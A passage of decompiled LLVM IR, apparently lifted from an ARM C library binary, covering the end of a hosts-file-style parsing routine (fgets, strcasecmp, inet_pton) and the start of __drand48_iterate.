  %v5_1b7b4 = add i32 %v4_1b7b4, 1
  store i32 %v5_1b7b4, i32* %r2.global-to-local, align 4
  %v1_1b7b8 = inttoptr i32 %v5_1b7b4 to i8*
  %v2_1b7b8 = load i8, i8* %v1_1b7b8, align 1
  %v3_1b7b8 = zext i8 %v2_1b7b8 to i32
  store i32 %v3_1b7b8, i32* %r1.global-to-local, align 4
  %v2_1b7bc = icmp eq i8 %v2_1b7b8, 0
  br i1 %v2_1b7bc, label %dec_label_pc_1b818, label %dec_label_pc_1b7c4

dec_label_pc_1b7c4:                               ; preds = %dec_label_pc_1b7b8.preheader, %dec_label_pc_1b7b0
  %v8_1b7dc = phi i32 [ %v5_1b7b4, %dec_label_pc_1b7b0 ], [ %v0_1b7b820, %dec_label_pc_1b7b8.preheader ]
  %v1_1b7cc = phi i32 [ %v3_1b7b8, %dec_label_pc_1b7b0 ], [ %v3_1b7b823, %dec_label_pc_1b7b8.preheader ]
  %v2_1b7c8 = load i32, i32* @global_var_2b898, align 4
  store i32 %v2_1b7c8, i32* %r3.global-to-local, align 4
  %v3_1b7cc = mul nuw nsw i32 %v1_1b7cc, 2
  %v4_1b7cc = add i32 %v3_1b7cc, %v2_1b7c8
  %v5_1b7cc = inttoptr i32 %v4_1b7cc to i8*
  %v6_1b7cc = load i8, i8* %v5_1b7cc, align 1
  %v8_1b7cc = zext i8 %v6_1b7cc to i32
  store i32 %v8_1b7cc, i32* %r3.global-to-local, align 4
  %v1_1b7d0 = and i32 %v8_1b7cc, 32
  %v2_1b7d0 = icmp eq i32 %v1_1b7d0, 0
  br i1 %v2_1b7d0, label %dec_label_pc_1b7d8, label %dec_label_pc_1b7b0

dec_label_pc_1b7d8:                               ; preds = %dec_label_pc_1b7c4
  %v0_1b7d8 = load i32, i32* @r6, align 4
  %v7_1b7dc = icmp slt i32 %v0_1b7d8, 7
  br i1 %v7_1b7dc, label %bb76, label %dec_label_pc_1b7ec.preheader

bb76:                                             ; preds = %dec_label_pc_1b7d8
  %v9_1b7dc = load i32, i32* @r4, align 4
  %v13_1b7dc = mul i32 %v0_1b7d8, 4
  %v14_1b7dc = add i32 %v9_1b7dc, %v13_1b7dc
  %v15_1b7dc = inttoptr i32 %v14_1b7dc to i32*
  store i32 %v8_1b7dc, i32* %v15_1b7dc, align 4
  %v8_1b7e0 = load i32, i32* @r6, align 4
  %v9_1b7e0 = add i32 %v8_1b7e0, 1
  store i32 %v9_1b7e0, i32* @r6, align 4
  %v0_1b7ec25.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1b7ec.preheader

dec_label_pc_1b7ec.preheader:                     ; preds = %bb76, %dec_label_pc_1b7d8
  %v0_1b7ec25 = phi i32 [ %v0_1b7ec25.pre, %bb76 ], [ %v8_1b7dc, %dec_label_pc_1b7d8 ]
  %v1_1b7ec26 = inttoptr i32 %v0_1b7ec25 to i8*
  %v2_1b7ec27 = load i8, i8* %v1_1b7ec26, align 1
  %v3_1b7ec28 = zext i8 %v2_1b7ec27 to i32
  store i32 %v3_1b7ec28, i32* %r1.global-to-local, align 4
  %v2_1b7f029 = icmp eq i8 %v2_1b7ec27, 0
  br i1 %v2_1b7f029, label %dec_label_pc_1b80c.loopexit, label %dec_label_pc_1b7f8.lr.ph

dec_label_pc_1b7f8.lr.ph:                         ; preds = %dec_label_pc_1b7ec.preheader
  %v2_1b7fc.pre = load i32, i32* @global_var_2b898, align 4
  br label %dec_label_pc_1b7f8

dec_label_pc_1b7e8:                               ; preds = %dec_label_pc_1b7f8
  %v1_1b7e8 = add i32 %v0_1b7e8, 1
  store i32 %v1_1b7e8, i32* %r2.global-to-local, align 4
  %v1_1b7ec = inttoptr i32 %v1_1b7e8 to i8*
  %v2_1b7ec = load i8, i8* %v1_1b7ec, align 1
  %v3_1b7ec = zext i8 %v2_1b7ec to i32
  store i32 %v3_1b7ec, i32* %r1.global-to-local, align 4
  %v2_1b7f0 = icmp eq i8 %v2_1b7ec, 0
  br i1 %v2_1b7f0, label %dec_label_pc_1b80c.loopexit, label %dec_label_pc_1b7f8

dec_label_pc_1b7f8:                               ; preds = %dec_label_pc_1b7f8.lr.ph, %dec_label_pc_1b7e8
  %v0_1b7e8 = phi i32 [ %v0_1b7ec25, %dec_label_pc_1b7f8.lr.ph ], [ %v1_1b7e8, %dec_label_pc_1b7e8 ]
  %v1_1b800 = phi i32 [ %v3_1b7ec28, %dec_label_pc_1b7f8.lr.ph ], [ %v3_1b7ec, %dec_label_pc_1b7e8 ]
  store i32 %v2_1b7fc.pre, i32* %r3.global-to-local, align 4
  %v3_1b800 = mul nuw nsw i32 %v1_1b800, 2
  %v4_1b800 = add i32 %v3_1b800, %v2_1b7fc.pre
  %v5_1b800 = inttoptr i32 %v4_1b800 to i8*
  %v6_1b800 = load i8, i8* %v5_1b800, align 1
  %v8_1b800 = zext i8 %v6_1b800 to i32
  store i32 %v8_1b800, i32* %r3.global-to-local, align 4
  %v1_1b804 = and i32 %v8_1b800, 32
  %v2_1b804 = icmp eq i32 %v1_1b804, 0
  br i1 %v2_1b804, label %dec_label_pc_1b7e8, label %dec_label_pc_1b80c.loopexit

dec_label_pc_1b80c.loopexit:                      ; preds = %dec_label_pc_1b7f8, %dec_label_pc_1b7e8, %dec_label_pc_1b7ec.preheader
  %v0_1b80c = phi i32 [ %v0_1b7ec25, %dec_label_pc_1b7ec.preheader ], [ %v0_1b7e8, %dec_label_pc_1b7f8 ], [ %v1_1b7e8, %dec_label_pc_1b7e8 ]
  %v1_1b80c = inttoptr i32 %v0_1b80c to i8*
  %v2_1b80c = load i8, i8* %v1_1b80c, align 1
  %v3_1b80c = zext i8 %v2_1b80c to i32
  store i32 %v3_1b80c, i32* %r3.global-to-local, align 4
  %v2_1b810 = icmp eq i8 %v2_1b80c, 0
  br i1 %v2_1b810, label %dec_label_pc_1b818, label %dec_label_pc_1b7b8.preheader

dec_label_pc_1b7b8.preheader:                     ; preds = %dec_label_pc_1b80c.preheader, %dec_label_pc_1b80c.loopexit
  %v0_1b7b820 = phi i32 [ %v0_1b80c, %dec_label_pc_1b80c.loopexit ], [ %v0_1b80c30, %dec_label_pc_1b80c.preheader ]
  %v1_1b7b821 = inttoptr i32 %v0_1b7b820 to i8*
  %v2_1b7b822 = load i8, i8* %v1_1b7b821, align 1
  %v3_1b7b823 = zext i8 %v2_1b7b822 to i32
  store i32 %v3_1b7b823, i32* %r1.global-to-local, align 4
  %v2_1b7bc24 = icmp eq i8 %v2_1b7b822, 0
  br i1 %v2_1b7bc24, label %dec_label_pc_1b818, label %dec_label_pc_1b7c4

dec_label_pc_1b818:                               ; preds = %dec_label_pc_1b80c.loopexit, %dec_label_pc_1b7b8.preheader, %dec_label_pc_1b7b0, %dec_label_pc_1b80c.preheader
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1b81c = load i32, i32* @r6, align 4
  %v1_1b820 = load i32, i32* @r4, align 4
  %v5_1b820 = mul i32 %v0_1b81c, 4
  %v6_1b820 = add i32 %v1_1b820, %v5_1b820
  %v7_1b820 = inttoptr i32 %v6_1b820 to i32*
  store i32 0, i32* %v7_1b820, align 4
  %v7_1b824 = icmp sgt i32 %v0_1b81c, 1
  br i1 %v7_1b824, label %dec_label_pc_1b828, label %dec_label_pc_1b8cc

dec_label_pc_1b828:                               ; preds = %dec_label_pc_1b818
  %v2_1b828 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_1b828, i32* %r0.global-to-local, align 4
  %v7_1b82c = icmp eq i32 %v2_1b828, 1
  br i1 %v7_1b82c, label %dec_label_pc_1b900, label %dec_label_pc_1b834

dec_label_pc_1b834:                               ; preds = %dec_label_pc_1b828
  %v7_1b834 = icmp eq i32 %v2_1b828, 2
  br i1 %v7_1b834, label %dec_label_pc_1b840, label %dec_label_pc_1b86c.preheader

dec_label_pc_1b86c.preheader:                     ; preds = %dec_label_pc_1b834
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_1b86c

dec_label_pc_1b840:                               ; preds = %dec_label_pc_1b834
  store i32 %v0_1b604, i32* %r0.global-to-local, align 4
  %v0_1b844 = load i32, i32* @r4, align 4
  %v1_1b844 = inttoptr i32 %v0_1b844 to i32*
  %v2_1b844 = load i32, i32* %v1_1b844, align 4
  store i32 %v2_1b844, i32* @r1, align 4
  %v3_1b848 = call i32 @__GI_strcoll(i8* %v2_1b848, i32 %v2_1b844)
  store i32 %v3_1b848, i32* %r0.global-to-local, align 4
  %v2_1b84c = icmp eq i32 %v3_1b848, 0
  br i1 %v2_1b84c, label %dec_label_pc_1b87c, label %dec_label_pc_1b8cc

dec_label_pc_1b858:                               ; preds = %dec_label_pc_1b86c
  %v0_1b858 = load i32, i32* @r4, align 4
  %v4_1b858 = mul i32 %v1_1b858, 4
  %v5_1b858 = add i32 %v0_1b858, %v4_1b858
  %v6_1b858 = inttoptr i32 %v5_1b858 to i32*
  %v7_1b858 = load i32, i32* %v6_1b858, align 4
  store i32 %v7_1b858, i32* %r1.global-to-local, align 4
  %v3_1b85c = call i32 @__GI_strcasecmp(i8* %v2_1b848, i32 %v7_1b858)
  store i32 %v3_1b85c, i32* %r0.global-to-local, align 4
  %v2_1b860 = icmp eq i32 %v3_1b85c, 0
  %v0_1b864 = load i32, i32* @r5, align 4
  %v1_1b864 = add i32 %v0_1b864, 1
  store i32 %v1_1b864, i32* @r5, align 4
  br i1 %v2_1b860, label %dec_label_pc_1b87c, label %dec_label_pc_1b86c

dec_label_pc_1b86c:                               ; preds = %dec_label_pc_1b86c.preheader, %dec_label_pc_1b858
  %v1_1b858 = phi i32 [ 1, %dec_label_pc_1b86c.preheader ], [ %v1_1b864, %dec_label_pc_1b858 ]
  %v1_1b86c = load i32, i32* @r6, align 4
  store i32 %v0_1b604, i32* %r0.global-to-local, align 4
  %v5_1b874 = icmp slt i32 %v1_1b858, %v1_1b86c
  br i1 %v5_1b874, label %dec_label_pc_1b858, label %dec_label_pc_1b8cc

dec_label_pc_1b87c:                               ; preds = %dec_label_pc_1b858, %dec_label_pc_1b840
  store i32 %v0_1b5fc, i32* %r1.global-to-local, align 4
  br i1 %v7_1b880, label %dec_label_pc_1b888, label %dec_label_pc_1b8a4

dec_label_pc_1b888:                               ; preds = %dec_label_pc_1b87c
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_1b88c = load i32, i32* @r7, align 4
  store i32 %v0_1b88c, i32* %r2.global-to-local, align 4
  %v0_1b890 = load i32, i32* @r4, align 4
  %v1_1b890 = inttoptr i32 %v0_1b890 to i32*
  %v2_1b890 = load i32, i32* %v1_1b890, align 4
  store i32 %v2_1b890, i32* %r1.global-to-local, align 4
  %v3_1b894 = inttoptr i32 %v2_1b890 to i8*
  %v4_1b894 = call i32 @inet_pton(i32 2, i8* %v3_1b894, i32 %v0_1b88c)
  store i32 %v4_1b894, i32* %r0.global-to-local, align 4
  %v5_1b89c = icmp sgt i32 %v4_1b894, 0
  br i1 %v5_1b89c, label %dec_label_pc_1b6d8, label %dec_label_pc_1b8c8

dec_label_pc_1b8a4:                               ; preds = %dec_label_pc_1b87c
  store i32 %v0_1b5fc, i32* %r2.global-to-local, align 4
  br i1 %v7_1b8a8, label %dec_label_pc_1b8b0, label %dec_label_pc_1b8c8

dec_label_pc_1b8b0:                               ; preds = %dec_label_pc_1b8a4
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_1b8b4 = load i32, i32* @r4, align 4
  %v1_1b8b4 = inttoptr i32 %v0_1b8b4 to i32*
  %v2_1b8b4 = load i32, i32* %v1_1b8b4, align 4
  store i32 %v2_1b8b4, i32* %r1.global-to-local, align 4
  store i32 %v0_1b780, i32* %r2.global-to-local, align 4
  %v3_1b8bc = inttoptr i32 %v2_1b8b4 to i8*
  %v4_1b8bc = call i32 @inet_pton(i32 10, i8* %v3_1b8bc, i32 %v0_1b780)
  store i32 %v4_1b8bc, i32* %r0.global-to-local, align 4
  %v5_1b8c4 = icmp sgt i32 %v4_1b8bc, 0
  br i1 %v5_1b8c4, label %dec_label_pc_1b71c, label %dec_label_pc_1b8c8

dec_label_pc_1b8c8:                               ; preds = %dec_label_pc_1b888, %dec_label_pc_1b8a4, %dec_label_pc_1b8b0
  store i32 2, i32* @sl, align 4
  br label %dec_label_pc_1b8cc

dec_label_pc_1b8cc:                               ; preds = %dec_label_pc_1b86c, %dec_label_pc_1b840, %dec_label_pc_1b818, %dec_label_pc_1b8c8, %dec_label_pc_1b774
  %v0_1b8cc = load i32, i32* @fp, align 4
  store i32 %v0_1b8cc, i32* %r0.global-to-local, align 4
  %v0_1b8d0 = load i32, i32* @r8, align 4
  store i32 %v0_1b8d0, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-52.0, i32* %r2.global-to-local, align 4
  %v3_1b8d8 = call i32 @fgets(i32 %v0_1b8cc, i32 %v0_1b8d0, i32 %stack_var_-52.0)
  store i32 %v3_1b8d8, i32* %r0.global-to-local, align 4
  %v2_1b8dc = icmp eq i32 %v3_1b8d8, 0
  br i1 %v2_1b8dc, label %dec_label_pc_1b8e4, label %dec_label_pc_1b78c

dec_label_pc_1b8e4:                               ; preds = %dec_label_pc_1b8cc, %dec_label_pc_1b71c, %dec_label_pc_1b6d8
  %v2_1b8e4 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_1b8e4, i32* %r3.global-to-local, align 4
  %v7_1b8e8 = icmp eq i32 %v2_1b8e4, 1
  br i1 %v7_1b8e8, label %dec_label_pc_1b900, label %dec_label_pc_1b8f0

dec_label_pc_1b8f0:                               ; preds = %dec_label_pc_1b8e4
  store i32 %stack_var_-52.0, i32* %r0.global-to-local, align 4
  %v1_1b8f4 = inttoptr i32 %stack_var_-52.0 to i8*
  %v2_1b8f4 = call i32 @__GI_fclose(i8* %v1_1b8f4)
  store i32 %v2_1b8f4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1b900

dec_label_pc_1b8fc:                               ; preds = %dec_label_pc_1b618, %bb74, %dec_label_pc_1b66c, %dec_label_pc_1b664, %dec_label_pc_1b658, %dec_label_pc_1b644, %dec_label_pc_1b628
  store i32 34, i32* @sl, align 4
  br label %dec_label_pc_1b900

dec_label_pc_1b900:                               ; preds = %dec_label_pc_1b828, %dec_label_pc_1b8e4, %dec_label_pc_1b8f0, %dec_label_pc_1b6c0, %dec_label_pc_1b8fc
  %v0_1b900 = load i32, i32* @sl, align 4
  store i32 %v0_1b900, i32* %r0.global-to-local, align 4
  store i32 %v3_1b5e8, i32* @r4, align 4
  store i32 %v6_1b5e8, i32* @r5, align 4
  store i32 %v12_1b5e8, i32* @r7, align 4
  store i32 %v15_1b5e8, i32* @r8, align 4
  store i32 %v21_1b5e8, i32* @sl, align 4
  store i32 %v24_1b5e8, i32* @fp, align 4
  ret i32 %v0_1b900

; uselistorder directives
  uselistorder i32 %v1_1b858, { 1, 0 }
  uselistorder i32 %v0_1b81c, { 1, 0 }
  uselistorder i32 %v3_1b7b823, { 1, 0 }
  uselistorder i32 %v0_1b7b820, { 1, 0 }
  uselistorder i32 %v2_1b794, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.0, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-40.1, { 1, 0 }
  uselistorder i32 %v0_1b694, { 1, 0 }
  uselistorder i32 %v0_1b658, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1b63c, { 1, 0 }
  uselistorder i32 %v0_1b608, { 1, 0, 2 }
  uselistorder i32 %v0_1b5fc, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1b5f8, { 4, 2, 3, 1, 0 }
  uselistorder i32 %tmp61, { 1, 0, 3, 2 }
  uselistorder i32 %tmp57, { 0, 2, 3, 1 }
  uselistorder i32 %tmp56, { 3, 0, 1, 2 }
  uselistorder i32 %tmp53, { 0, 4, 3, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 10, 16, 11, 12, 13, 14, 15, 24, 17, 18, 1, 2, 3, 4, 5, 6, 7, 8, 9, 19, 20, 21, 22, 23 }
  uselistorder i32* %r2.global-to-local, { 13, 3, 4, 8, 9, 18, 10, 19, 11, 12, 20, 0, 1, 2, 5, 6, 7, 14, 16, 15, 17 }
  uselistorder i32* %r1.global-to-local, { 13, 4, 7, 8, 9, 0, 10, 1, 11, 12, 2, 3, 5, 6, 14 }
  uselistorder i32* %r0.global-to-local, { 0, 5, 1, 22, 21, 11, 6, 13, 12, 14, 15, 18, 16, 17, 20, 19, 2, 3, 4, 7, 8, 9, 10, 23, 25, 24 }
  uselistorder i32* %ip.global-to-local, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 34, { 6, 5, 1, 2, 0, 7, 8, 9, 3, 4 }
  uselistorder i32 (i8*)* @__GI_fclose, { 4, 5, 0, 1, 2, 3 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 2, 1, 0, 5, 4, 3 }
  uselistorder i32 (i8*, i32)* @__GI_strcasecmp, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 (i8*, i32)* @__GI_strcoll, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* @global_var_2b898, { 0, 6, 2, 7, 1, 3, 4, 5 }
  uselistorder i32 35, { 3, 8, 9, 0, 6, 1, 7, 2, 4, 5 }
  uselistorder i32 ()* @__errno_location, { 57, 125, 124, 123, 56, 36, 34, 55, 21, 33, 25, 94, 121, 48, 128, 130, 129, 127, 30, 122, 29, 40, 20, 19, 18, 120, 93, 132, 71, 70, 64, 63, 119, 118, 117, 23, 24, 95, 16, 85, 26, 31, 65, 116, 49, 115, 114, 51, 61, 47, 37, 60, 46, 39, 28, 38, 1, 53, 52, 15, 42, 62, 14, 7, 2, 92, 59, 13, 44, 102, 101, 103, 43, 54, 113, 112, 50, 91, 111, 6, 12, 75, 110, 106, 22, 11, 0, 32, 90, 41, 35, 3, 73, 72, 109, 58, 27, 17, 5, 4, 108, 107, 105, 104, 10, 100, 99, 98, 89, 97, 96, 9, 8, 88, 87, 86, 84, 83, 82, 81, 80, 79, 78, 77, 76, 131, 74, 126, 45, 69, 68, 67, 66 }
  uselistorder i32 80, { 0, 7, 4, 5, 6, 1, 3, 2 }
  uselistorder i32 48, { 13, 4, 16, 8, 9, 10, 5, 2, 17, 18, 19, 3, 20, 6, 21, 15, 22, 1, 0, 14, 11, 23, 12, 7 }
  uselistorder i32 36, { 11, 12, 13, 15, 16, 17, 18, 4, 7, 8, 5, 22, 1, 14, 0, 19, 20, 21, 3, 9, 6, 10, 2 }
  uselistorder i32 56, { 11, 16, 17, 2, 18, 3, 4, 13, 19, 14, 10, 6, 1, 15, 12, 0, 7, 8, 9, 20, 5 }
  uselistorder i32 44, { 14, 15, 16, 19, 20, 21, 9, 2, 3, 4, 5, 6, 7, 8, 1, 13, 22, 18, 0, 17, 10, 11, 12, 23 }
  uselistorder i32 -48, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i32* @fp, { 27, 30, 28, 1, 29, 31, 32, 33, 34, 0, 36, 35, 37, 38, 39, 68, 69, 70, 71, 72, 5, 2, 40, 41, 42, 43, 44, 45, 46, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 6, 3, 4, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 47, 48, 49, 50, 51, 52, 53, 54, 55, 73 }
  uselistorder i32* @sl, { 38, 39, 40, 41, 44, 42, 43, 45, 46, 47, 48, 49, 50, 51, 52, 53, 17, 18, 19, 20, 21, 22, 23, 24, 29, 119, 120, 0, 121, 122, 123, 54, 58, 1, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 25, 2, 26, 27, 28, 30, 31, 109, 110, 111, 15, 16, 112, 113, 114, 115, 116, 117, 118, 32, 33, 124, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 59, 60, 61, 97, 98, 99, 100, 101, 102, 103, 3, 104, 105, 106, 107, 108, 93, 94, 95, 96, 55, 56, 57, 37, 34, 36, 35, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder label %dec_label_pc_1b900, { 4, 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1b8fc, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_1b8cc, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_1b8c8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1b86c, { 1, 0 }
  uselistorder label %dec_label_pc_1b818, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1b7b8.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1b7f8, { 1, 0 }
  uselistorder label %dec_label_pc_1b774, { 1, 0 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_1b628, { 1, 0 }
}

define i32 @__drand48_iterate() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_1b910 = load i32, i32* @r4, align 4
  store i32 %v3_1b910, i32* %stack_var_-36, align 4
  %v0_1b914 = load i32, i32* @r1, align 4
  %v1_1b914 = add i32 %v0_1b914, 15
  %v2_1b914 = inttoptr i32 %v1_1b914 to i8*
  %v3_1b914 = load i8, i8* %v2_1b914, align 1
  %v4_1b914 = zext i8 %v3_1b914 to i32
  store i32 %v4_1b914, i32* %r3.global-to-local, align 4
  %v1_1b918 = add i32 %v0_1b914, 14
  %v2_1b918 = inttoptr i32 %v1_1b918 to i8*
  %v3_1b918 = load i8, i8* %v2_1b918, align 1
  %v4_1b918 = zext i8 %v3_1b918 to i32
  %v4_1b920 = mul nuw nsw i32 %v4_1b914, 256
  %v5_1b920 = or i32 %v4_1b918, %v4_1b920
  store i32 %v5_1b920, i32* %r2.global-to-local, align 4
  %v7_1b920 = icmp eq i32 %v5_1b920, 0
  %v0_1b924 = load i32, i32* @r0, align 4
  %v1_1b924 = add i32 %v0_1b924, 4
  store i32 %v1_1b924, i32* %r3.global-to-local, align 4
  store i32 %v0_1b914, i32* %r5.global-to-local, align 4
  store i32 %v0_1b924, i32* %r8.global-to-local, align 4
  store i32 %v1_1b924, i32* %stack_var_-40, align 4
  %v1_1b934 = add i32 %v0_1b924, 2
  store i32 %v1_1b934, i32* %sb.global-to-local, align 4
  br i1 %v7_1b920, label %dec_label_pc_1b93c, label %dec_label_pc_1b964

dec_label_pc_1b93c:                               ; preds = %entry
  %v3_1b940 = add i32 %v0_1b914, 12
  %v4_1b940 = inttoptr i32 %v3_1b940 to i8*
  store i8 11, i8* %v4_1b940, align 1
  %v2_1b948 = load i32, i32* @r1, align 4
  %v3_1b948 = add i32 %v2_1b948, 14
  %v4_1b948 = inttoptr i32 %v3_1b948 to i8*
  store i8 1, i8* %v4_1b948, align 1
  store i32 -554899859, i32* %r3.global-to-local, align 4
  store i32 5, i32* %r4.global-to-local, align 4
  %v1_1b954 = load i32, i32* @r1, align 4
  %v2_1b954 = add i32 %v1_1b954, 16
  %v3_1b954 = inttoptr i32 %v2_1b954 to i32*
  store i32 -554899859, i32* %v3_1b954, align 4
  %v0_1b958 = load i32, i32* %r4.global-to-local, align 4
  %v1_1b958 = load i32, i32* @r1, align 4
  %v2_1b958 = add i32 %v1_1b958, 20
  %v3_1b958 = inttoptr i32 %v2_1b958 to i32*
  store i32 %v0_1b958, i32* %v3_1b958, align 4
  %v0_1b95c = load i32, i32* %r2.global-to-local, align 4
  %v1_1b95c = trunc i32 %v0_1b95c to i8
  %v2_1b95c = load i32, i32* @r1, align 4
  %v3_1b95c = add i32 %v2_1b95c, 15
  %v4_1b95c = inttoptr i32 %v3_1b95c to i8*
  store i8 %v1_1b95c, i8* %v4_1b95c, align 1
  %v0_1b960 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b960 = trunc i32 %v0_1b960 to i8
  %v2_1b960 = load i32, i32* @r1, align 4
  %v3_1b960 = add i32 %v2_1b960, 13
  %v4_1b960 = inttoptr i32 %v3_1b960 to i8*
  store i8 %v1_1b960, i8* %v4_1b960, align 1
  %v2_1b964.pre = load i32, i32* %stack_var_-40, align 4
  %v0_1b968.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_1b970.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_1b9a4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1b964

dec_label_pc_1b964:                               ; preds = %entry, %dec_label_pc_1b93c
  %v0_1b9b0 = phi i32 [ %v0_1b914, %entry ], [ %v0_1b9a4.pre, %dec_label_pc_1b93c ]
  %v2_1b9cc = phi i32 [ %v0_1b924, %entry ], [ %v0_1b970.pre, %dec_label_pc_1b93c ]
  %v0_1b968 = phi i32 [ %v1_1b934, %entry ], [ %v0_1b968.pre, %dec_label_pc_1b93c ]
  %v2_1b964 = phi i32 [ %v1_1b924, %entry ], [ %v2_1b964.pre, %dec_label_pc_1b93c ]
  store i32 %v2_1b964, i32* %r4.global-to-local, align 4
  %v1_1b968 = add i32 %v0_1b968, 1
  %v2_1b968 = inttoptr i32 %v1_1b968 to i8*
  %v3_1b968 = load i8, i8* %v2_1b968, align 1
  %v4_1b968 = zext i8 %v3_1b968 to i32
  store i32 %v4_1b968, i32* %ip.global-to-local, align 4
  %v1_1b96c = add i32 %v2_1b964, 1
  %v2_1b96c = inttoptr i32 %v1_1b96c to i8*
  %v3_1b96c = load i8, i8* %v2_1b96c, align 1
  %v4_1b96c = zext i8 %v3_1b96c to i32
  store i32 %v4_1b96c, i32* %lr.global-to-local, align 4
  %v1_1b970 = add i32 %v2_1b9cc, 4
  %v2_1b970 = inttoptr i32 %v1_1b970 to i8*
  %v3_1b970 = load i8, i8* %v2_1b970, align 1
  %v4_1b970 = zext i8 %v3_1b970 to i32
  %v1_1b974 = inttoptr i32 %v2_1b9cc to i8*
  %v2_1b974 = load i8, i8* %v1_1b974, align 1
  %v3_1b974 = zext i8 %v2_1b974 to i32
  %v1_1b978 = add i32 %v2_1b9cc, 1
  %v2_1b978 = inttoptr i32 %v1_1b978 to i8*
  %v3_1b978 = load i8, i8* %v2_1b978, align 1
  %v4_1b978 = zext i8 %v3_1b978 to i32
  store i32 %v4_1b978, i32* %r3.global-to-local, align 4
  %v1_1b97c = add i32 %v2_1b9cc, 2
  %v2_1b97c = inttoptr i32 %v1_1b97c to i8*
  %v3_1b97c = load i8, i8* %v2_1b97c, align 1
  %v4_1b97c = zext i8 %v3_1b97c to i32
  %v4_1b980 = mul nuw nsw i32 %v4_1b96c, 256
  %v5_1b980 = or i32 %v4_1b970, %v4_1b980
  store i32 %v5_1b980, i32* %r6.global-to-local, align 4
  %v4_1b984 = mul nuw nsw i32 %v4_1b978, 256
  %v5_1b984 = or i32 %v4_1b984, %v3_1b974
  %v4_1b988 = mul nuw nsw i32 %v4_1b968, 256
  %v5_1b988 = or i32 %v4_1b97c, %v4_1b988
  store i32 %v5_1b984, i32* %r3.global-to-local, align 4
  %v3_1b998 = mul i32 %v5_1b988, 65536
  %v2_1b99c = or i32 %v3_1b998, %v5_1b984
  %v1_1b9a4 = add i32 %v0_1b9b0, 16
  store i32 %v1_1b9a4, i32* %r2.global-to-local, align 4
  %v1_1b9a8 = inttoptr i32 %v1_1b9a4 to i32*
  %v2_1b9a8 = load i32, i32* %v1_1b9a8, align 4
  store i32 %v2_1b9a8, i32* %r2.global-to-local, align 4
  %v3_1b9a8 = add i32 %v0_1b9b0, 20
  %v4_1b9a8 = inttoptr i32 %v3_1b9a8 to i32*
  %v5_1b9a8 = load i32, i32* %v4_1b9a8, align 4
  store i32 %v5_1b9a8, i32* %r3.global-to-local, align 4
  %v2_1b9ac = mul i32 %v2_1b9a8, %v2_1b99c
  %v1_1b9b0 = add i32 %v0_1b9b0, 13
  %v2_1b9b0 = inttoptr i32 %v1_1b9b0 to i8*
  %v3_1b9b0 = load i8, i8* %v2_1b9b0, align 1
  %v4_1b9b0 = zext i8 %v3_1b9b0 to i32
  store i32 %v4_1b9b0, i32* %ip.global-to-local, align 4
  %v1_1b9b4 = add i32 %v0_1b9b0, 12
  %v2_1b9b4 = inttoptr i32 %v1_1b9b4 to i8*
  %v3_1b9b4 = load i8, i8* %v2_1b9b4, align 1
  %v4_1b9b4 = zext i8 %v3_1b9b4 to i32
  %v4_1b9b8 = mul nuw nsw i32 %v4_1b9b0, 256
  %v5_1b9b8 = or i32 %v4_1b9b4, %v4_1b9b8
  %v2_1b9bc = add i32 %v5_1b9b8, %v2_1b9ac
  store i32 %v2_1b9bc, i32* %r5.global-to-local, align 4
  %v3_1b9bc = icmp ult i32 %v2_1b9bc, %v2_1b9ac
  %v2_1b9c0 = zext i1 %v3_1b9bc to i32
  %v3_1b9c0 = add nuw nsw i32 %v2_1b9c0, %v5_1b980
  store i32 %v3_1b9c0, i32* %r6.global-to-local, align 4
  %v3_1b9c4 = udiv i32 %v2_1b9bc, 65536
  %v4_1b9c8 = mul i32 %v3_1b9c0, 65536
  %v5_1b9c8 = or i32 %v4_1b9c8, %v3_1b9c4
  store i32 %v5_1b9c8, i32* %r3.global-to-local, align 4
  %v1_1b9cc = trunc i32 %v3_1b9c4 to i8
  store i8 %v1_1b9cc, i8* %v2_1b97c, align 1
  %v0_1b9d0 = load i32, i32* %r3.global-to-local, align 4
  %v3_1b9d0 = sdiv i32 %v0_1b9d0, 256
